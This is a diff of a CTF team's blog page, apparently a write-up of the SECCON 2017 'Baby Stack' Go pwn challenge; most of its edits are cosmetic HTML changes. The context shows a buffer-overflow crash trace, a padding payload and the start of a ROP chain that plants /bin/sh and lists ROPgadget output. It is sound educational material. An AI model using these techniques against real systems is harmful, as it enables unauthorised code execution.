@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-<head><meta name="generator" content="Hexo 3.8.0">
+<head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
@@ -17,7 +17,7 @@
   
   <title>[Pwn] SECCON - Baby Stack | TeamRocketIST - Portuguese CTF Team</title>
   <meta name="description" content="Baby StackCan you do a traditional stack attack?Host : baby_stack.pwn.seccon.jpPort : 15285baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8  Overflow the BufferWe have a go">
-<meta name="keywords" content="rop,stack_overflow,pwn,go,seccon2017,statically_linked">
+<meta name="keywords" content="stack_overflow,pwn,rop,go,seccon2017,statically_linked">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[Pwn] SECCON - Baby Stack">
 <meta property="og:url" content="https://teamrocketist.github.io/2017/12/13/Pwn-SECCON-Baby-Stack/index.html">
@@ -66,7 +66,7 @@
 
     <form class="search-form sidebar-form">
         <div class="input-group">
-            <input type="text" class="search-form-input form-control" placeholder="Search">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
             <span class="input-group-btn">
                 <button type="submit" class="search-form-submit btn btn-flat"><i class="fa fa-search"></i></button>
             </span>
@@ -76,7 +76,7 @@
     <div class="ins-search-mask"></div>
     <div class="ins-search-container">
         <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech="">
+            <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
             <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
             <!-- <span class="ins-close ins-selectable"><i class="fa fa-times"></i></span> -->
         </div>
@@ -163,11 +163,11 @@
 	
     <ul class="social-links">
     	
-        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="fa fa-github"></i></a></li>
+        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="fa fa-github"></i></a></li>
         
-        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle="tooltip" data-placement="top"><i class="fa fa-twitter"></i></a></li>
+        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="fa fa-twitter"></i></a></li>
         
-        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="fa fa-rss"></i></a></li>
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="fa fa-rss"></i></a></li>
         
     </ul>
     
@@ -332,7 +332,7 @@
   
   <section class="main">
   <div class="content">
-  <article id="post-Pwn-SECCON-Baby-Stack" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <article id="post-Pwn-SECCON-Baby-Stack" class="article article-type-post" itemscope itemprop="blogPost">
     
     <header class="article-header">
       
@@ -391,7 +391,7 @@
 <p>We don’t have a stack canary to stop us so the first thing to do is to run the binary:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 </span><br><span class="line">Please tell me your name &gt;&gt; A</span><br><span class="line">Give me your message &gt;&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa</span><br><span class="line">unexpected fault address 0x0</span><br><span class="line">fatal error: fault</span><br><span class="line">[signal 0xb code=0x80 addr=0x0 pc=0x456551]</span><br><span class="line"></span><br><span class="line">goroutine 1 [running]:</span><br><span class="line">runtime.throw(0x507550, 0x5)</span><br><span class="line">	/usr/lib/go-1.6/src/runtime/panic.go:547 +0x90 fp=0xc82003f5b8 sp=0xc82003f5a0</span><br><span class="line">runtime.sigpanic()</span><br><span class="line">	/usr/lib/go-1.6/src/runtime/sigpanic_unix.go:27 +0x2ab fp=0xc82003f608 sp=0xc82003f5b8</span><br><span class="line">runtime.memmove(0xc82008a00b, 0x4141414141414141, 0x61414141)</span><br><span class="line">	/usr/lib/go-1.6/src/runtime/memmove_amd64.s:83 +0x91 fp=0xc82003f610 sp=0xc82003f608</span><br><span class="line">fmt.(*fmt).padString(0xc82006ebb8, 0x4141414141414141, 0x61414141)</span><br><span class="line">	/usr/lib/go-1.6/src/fmt/format.go:130 +0x456 fp=0xc82003f730 sp=0xc82003f610</span><br><span class="line">fmt.(*fmt).fmt_s(0xc82006ebb8, 0x4141414141414141, 0x61414141)</span><br><span class="line">	/usr/lib/go-1.6/src/fmt/format.go:322 +0x61 fp=0xc82003f760 sp=0xc82003f730</span><br><span class="line">fmt.(*pp).fmtString(0xc82006eb60, 0x4141414141414141, 0x61414141, 0xc800000073)</span><br><span class="line">	/usr/lib/go-1.6/src/fmt/print.go:521 +0xdc fp=0xc82003f790 sp=0xc82003f760</span><br><span class="line">fmt.(*pp).printArg(0xc82006eb60, 0x4c1c00, 0xc82000a380, 0x73, 0x0, 0x0)</span><br><span class="line">	/usr/lib/go-1.6/src/fmt/print.go:797 +0xd95 fp=0xc82003f918 sp=0xc82003f790</span><br><span class="line">fmt.(*pp).doPrintf(0xc82006eb60, 0x5220a0, 0x18, 0xc82003fea8, 0x2, 0x2)</span><br><span class="line">	/usr/lib/go-1.6/src/fmt/print.go:1238 +0x1dcd fp=0xc82003fca0 sp=0xc82003f918</span><br><span class="line">fmt.Fprintf(0x7fcd857d21e8, 0xc82002c010, 0x5220a0, 0x18, 0xc82003fea8, 0x2, 0x2, 0x40beee, 0x0, 0x0)</span><br><span class="line">	/usr/lib/go-1.6/src/fmt/print.go:188 +0x74 fp=0xc82003fce8 sp=0xc82003fca0</span><br><span class="line">fmt.Printf(0x5220a0, 0x18, 0xc82003fea8, 0x2, 0x2, 0x20, 0x0, 0x0)</span><br><span class="line">	/usr/lib/go-1.6/src/fmt/print.go:197 +0x94 fp=0xc82003fd50 sp=0xc82003fce8</span><br><span class="line">main.main()</span><br><span class="line">	/home/yutaro/CTF/SECCON/2017/baby_stack/baby_stack.go:23 +0x45e fp=0xc82003ff50 sp=0xc82003fd50</span><br><span class="line">runtime.main()</span><br><span class="line">	/usr/lib/go-1.6/src/runtime/proc.go:188 +0x2b0 fp=0xc82003ffa0 sp=0xc82003ff50</span><br><span class="line">runtime.goexit()</span><br><span class="line">	/usr/lib/go-1.6/src/runtime/asm_amd64.s:1998 +0x1 fp=0xc82003ffa8 sp=0xc82003ffa0</span><br></pre></td></tr></table></figure>
 <p>We did overflow the buffer but what really happened here? If you look at the stack traces we <strong>aren’t</strong> really getting a <strong>segmentation fault</strong> because we are replacing the ret address, the exception is occurring because we are changing the parameters of <strong><code>fmt.Printf</code></strong>, the binary isn’t reaching the <strong><code>ret</code></strong> instruction because of this, we need to set some <strong>break points</strong> before this prints to put the correct addresses on them, something that doesn’t crash the program.</p>
-<p>To check good breakpoint addresses I used IDA, radare2 was way too slow and didn’t gave me nice results on it, after opening it in IDA I searched for a function named <strong><code>main_main</code></strong> and tryed to find a function <strong><code>bufio___Scanner__Scan</code></strong> which in go is a function that reads inputs from the <strong><code>STDIN</code></strong>.<br><a data-fancybox="gallery" href="https://i.imgur.com/0kyUAPc.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/0kyUAPc.png" alt=""><br></a><br>Checking it on another view to check its addresses:<br><a data-fancybox="gallery" href="https://i.imgur.com/HEuxv0i.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/HEuxv0i.png" alt=""><br></a></p>
+<p>To check good breakpoint addresses I used IDA, radare2 was way too slow and didn’t gave me nice results on it, after opening it in IDA I searched for a function named <strong><code>main_main</code></strong> and tryed to find a function <strong><code>bufio___Scanner__Scan</code></strong> which in go is a function that reads inputs from the <strong><code>STDIN</code></strong>.<br><a data-fancybox="gallery" href="https://i.imgur.com/0kyUAPc.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/0kyUAPc.png" alt><br></a><br>Checking it on another view to check its addresses:<br><a data-fancybox="gallery" href="https://i.imgur.com/HEuxv0i.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/HEuxv0i.png" alt><br></a></p>
 <p>After setting some breakpoints in the <strong>printf’s</strong> after those 2 scans, I realised that the padding needed to reach the 1st parameter was <strong>104</strong> so we can start testing it in the binary:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print 'A'*104 + 'BBBBBBBB'"</span></span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB</span><br><span class="line">$ ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 </span><br><span class="line">Please tell me your name &gt;&gt; A</span><br><span class="line">Give me your message &gt;&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB</span><br><span class="line">...</span><br><span class="line">runtime.memmove(0xc82000e30b, 0x4242424242424242, 0x1)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 <p>There it is, we are replacing the address of the string that <strong><code>printf</code></strong> wants to print, we can’t continue overflowing the rest to reach the <strong><code>ret</code></strong> instruction, to get this valid address I just picked a value that I got from gdb from the stack:</p>
@@ -408,7 +408,7 @@
 <h3 id="Build-a-ropchain"><a href="#Build-a-ropchain" class="headerlink" title="Build a ropchain"></a>Build a ropchain</h3><p>Now that we replaced the return address to <strong><code>0xdeadbeef</code></strong> we can finally start by doing our ropchain, to build this ropchain we need to know a bit of assembly but first we need to know how a syscall works as assembly and which registers it uses as arguments:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syscall(RAX, RDI, RSI, RDX)</span><br></pre></td></tr></table></figure>
 <p>Where <strong><code>RAX</code></strong> is the system call number and <strong><code>RDI</code></strong> must have an address that points into <strong>‘/bin/sh’</strong> the rest of the registers are about the arguments! in this case we can just set them into zeros… So to build a successful ropchain we need to search some good gadgets.</p>
-<h4 id="Setting-bin-sh-address-to-RDI"><a href="#Setting-bin-sh-address-to-RDI" class="headerlink" title="Setting /bin/sh address to RDI"></a>Setting /bin/sh address to RDI</h4><p>First of all we need to store /bin/sh into memory, we need a valid address to store it so we actually need to find a nice one to store our string, normally we want to use the .bss data segment, we can find it’s address in IDA:<br><a data-fancybox="gallery" href="https://i.imgur.com/VtO8xjO.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/VtO8xjO.png" alt=""><br></a></p>
+<h4 id="Setting-bin-sh-address-to-RDI"><a href="#Setting-bin-sh-address-to-RDI" class="headerlink" title="Setting /bin/sh address to RDI"></a>Setting /bin/sh address to RDI</h4><p>First of all we need to store /bin/sh into memory, we need a valid address to store it so we actually need to find a nice one to store our string, normally we want to use the .bss data segment, we can find it’s address in IDA:<br><a data-fancybox="gallery" href="https://i.imgur.com/VtO8xjO.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/VtO8xjO.png" alt><br></a></p>
 <p><strong>.bss</strong> is perfect its address doesn’t change on different runs because <strong><code>PIE</code></strong> protection isn’t enabled, and as the picture above says in IDA we have <strong><code>read</code></strong> and <strong><code>write</code></strong> permissions which is what we want.</p>
 <p>Now we need a special gadget for this, we need something that moves data from a register into a memory address, the ideal gadget would be <strong><code>MOV [RDI], RAX</code></strong>, with the preference that it’s a <strong>qword MOV</strong>, since <strong>/bin/sh</strong> is a quite <strong>big string</strong> we need a <strong>64bit MOV</strong> (if a 64 bit MOV weren’t available we could do it by spliting into multiple moves), so lets check with <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">ROPGadgets</a>, if we have a 64bit MOV:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 | grep <span class="string">'mov qword ptr \[rdi\], '</span></span><br><span class="line">0x000000000045681b : clc ; mov qword ptr [rdi], rax ; mov qword ptr [rdi + rbx - 8], rcx ; ret</span><br><span class="line">0x0000000000456826 : mov eax, dword ptr [rsi] ; mov qword ptr [rdi], rax ; ret</span><br><span class="line">0x0000000000456490 : mov qword ptr [rdi], rax ; mov qword ptr [rdi + rbx - 8], rax ; ret</span><br><span class="line">0x000000000045681c : mov qword ptr [rdi], rax ; mov qword ptr [rdi + rbx - 8], rcx ; ret</span><br><span class="line">0x0000000000456499 : mov qword ptr [rdi], rax ; ret</span><br><span class="line">0x0000000000456825 : mov rax, qword ptr [rsi] ; mov qword ptr [rdi], rax ; ret</span><br></pre></td></tr></table></figure>
@@ -489,7 +489,7 @@
   
 </div>
 
-  <nav class="bar bar-footer clearfix" data-stick-bottom="">
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
   
   <ul class="pager pull-left">
     
